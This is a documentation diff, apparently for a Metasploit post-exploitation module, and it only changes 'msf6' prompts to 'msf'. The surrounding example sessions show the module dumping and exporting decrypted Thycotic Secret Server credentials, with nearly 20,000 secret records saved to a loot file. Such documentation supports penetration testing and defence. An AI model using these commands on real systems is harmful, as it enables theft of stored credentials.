@@ -40,9 +40,9 @@ Which session to use, which can be viewed with `sessions -l`
 Windows Server 2019 host running Secret Server 11.2 using the `dump` action:
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
-msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
-msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > dump
+msf exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
+msf post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
+msf post(windows/gather/credentials/thycotic_secretserver_dump) > dump
 
 [*] Hostname THYCOTIC IPv4 10.1.0.113
 [*] Decrypt database.config ...
@@ -97,14 +97,14 @@ msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > dump
 [+] 19836 unique SecretID records recovered
 [+] Decrypted Secret Server Database Dump: /root/.msf4/loot/20220829112547_default_10.1.0.113_thycotic_secrets_357639.txt
 [*] Post module execution completed
-msf6 post(multi/gather/thycotic_secretserver_dump) > 
+msf post(multi/gather/thycotic_secretserver_dump) > 
 ```
 
 Windows Server 2019 host running Secret Server 11.2 using the `export` action:
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
-msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
-msf6 post(windows/gather/credentials/thycotic_secretserver_dump) > export
+msf exploit(multi/handler) > use post/windows/gather/credentials/thycotic_secretserver_dump
+msf post(windows/gather/credentials/thycotic_secretserver_dump) > set session 1
+msf post(windows/gather/credentials/thycotic_secretserver_dump) > export
 
 [*] Hostname THYCOTIC IPv4 10.1.0.113
 [*] Decrypt database.config ...
